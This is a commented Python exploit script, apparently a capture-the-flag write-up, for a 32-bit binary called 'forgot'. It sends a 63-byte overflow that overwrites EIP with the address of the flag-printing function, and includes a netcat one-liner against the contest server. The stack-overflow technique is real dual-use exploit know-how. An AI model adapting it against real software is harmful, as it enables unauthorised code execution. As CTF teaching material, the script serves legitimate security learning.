from pwn import *

# hack.bckdr.in port 8009
# During the competition I used:
# python -c 'print "A"*63 + "\xcc\x86\x04\x08"' | nc hack.bckdr.in 8009
# This is an aftermath attempt to write python code to solve this.
# This code will work, you just might have to run it a couple times.
# I suspect its due to when the data is being displayed.

# pwntools is great. Look it up if you don't have it.

# Install of pwntools is a simple pip install pwntools
context(arch = 'i386', os = 'linux')
# Should work even when they take servers down. There will
# need to be a local file called 'flag'. Put something
# recognizable in it.
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
    l = listen(0)
    l.spawn_process(['./forgot'])
    r = remote('localhost', l.lport)

# If you open forgot in a disassembler and check the strings
# you will see 'flag'. Look at the method using this string
# and you will see that it opens 'flag' and displays it.
# The goal of this exploit is to redirect program execution
# to this method. If we can overwrite eip with the address
# of the print flag method, we'll do just that.

# Using trial and error I found you could overflow with
# the eip with 67 bytes
overflow = "A"*63

# Address of method that opens and prints flag.txt.
addr = 0x080486cc

# Construct the payload. Let's thank pwntools for making
# this easy and straight forward. p32 will pack the given input
# into a 32 bit (4 byte) value that has the correct endianness
overflow += p32(addr)

# Need to receive data until they ask for input
r.recv()

# Now that program is ready, send our payload
r.send(overflow + "\n")
print "[*] Overflow sent."

# garbage being printed back to us
r.recvuntil("Enter the string to be validate") 

# Now get the flag, display it and feel accomplished.
flag = r.recv()
print "[*] Flag: " + flag

r.close()

# RyanAiden 